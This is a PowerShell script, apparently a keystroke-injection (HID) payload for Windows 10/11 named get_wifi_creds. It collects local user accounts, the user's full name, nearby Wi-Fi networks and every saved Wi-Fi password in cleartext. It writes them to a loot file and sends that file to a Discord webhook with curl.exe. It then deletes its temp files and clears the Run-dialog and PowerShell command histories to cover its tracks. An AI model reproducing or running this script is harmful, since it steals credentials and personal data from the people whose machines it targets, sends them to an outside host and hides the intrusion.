######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :get_wifi_creds                  |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
###################################################################################################################################################################### 
<#

.DESCRIPTION
          This program collects wifi network information and passwds from client. Puts the information in a zip file and exfiltrates the file to Discord.
#>

######################################################################################################################################################################

New-Item "$env:tmp/$env:USERNAME-wifi-creds" -ItemType Directory -Force

######################################################################################################################################################################

#Date and time script was executed
$CreatedOn = get-date -f 'M/d/yyyy h:mmtt'

#Local user(s) account, name, and security id:
$LUser = Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String

######################################################################################################################################################################

#Get associated fullName
function Get-fullName {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

        if($fullName -gt $null) {

                 return $fullName
 
        }else{
                 Write-Host("No full name available for...$env:UserName")
    } 

}

$fullName = Get-fullName

######################################################################################################################################################################

#networks nearby or notify wifi interface is down.

function NearbyWifi {

    $NearbyWifi = (netsh wlan show networks mode=Bssid) | Format-Table -autosize | Out-String -width 250

        if($NearbyWifi -gt $null) {

            return $NearbyWifi

        }elseif($NearbyWifi -eq ("*powered down and doesn't support*")){

            Write-Host("`nInterface Name: Wi-Fi`nThe wireless local area network interface is powered down and doesn't support the requested operation.")

        }else{

            Write-Host("No nearby wifi networks detected.")

        }

}

$NearbyWifi = NearbyWifi

######################################################################################################################################################################

#History of wifi network profiles and passwords
#referenced I-Am-Jakoby

$WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

######################################################################################################################################################################

#Outputs to loot file

$output = @"
######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.3                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################

Created On: $CreatedOn

Full Name: $fullName

Local Users:
$LUser

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles:
$WifiProfiles

------------------------------------------------------------------------------------------------------------------------------
"@

######################################################################################################################################################################

$output > $env:tmp\$env:USERNAME-wifi-creds\wireless_info.txt

######################################################################################################################################################################

#Discord Upload
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

#Webhook created in discord channel
$hookurl = "$dc"


$Body = @{
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file "$env:tmp\$env:USERNAME-wifi-creds"

######################################################################################################################################################################

#Clean up
#Clear temp folder
rm $env:tmp\$env:USERNAME* -r -Force -ErrorAction SilentlyContinue

#Clear run history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

#Clear powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath
